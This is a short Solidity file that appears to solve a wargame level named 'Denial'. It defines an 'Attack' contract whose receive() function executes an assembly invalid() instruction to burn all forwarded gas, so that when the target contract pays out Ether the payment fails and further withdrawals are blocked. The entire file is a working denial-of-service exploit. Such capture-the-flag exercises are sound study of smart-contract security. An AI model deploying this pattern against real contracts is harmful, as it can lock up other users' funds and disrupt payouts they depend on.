// SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import {Denial} from "../instances/Ilevel20.sol";

contract Attack {
    Denial target;

    constructor(Denial _target) {
        target = _target;
    }

    receive() external payable {
        assembly {
            invalid() //consumes all the gas & returns invalid
        }
    }
}
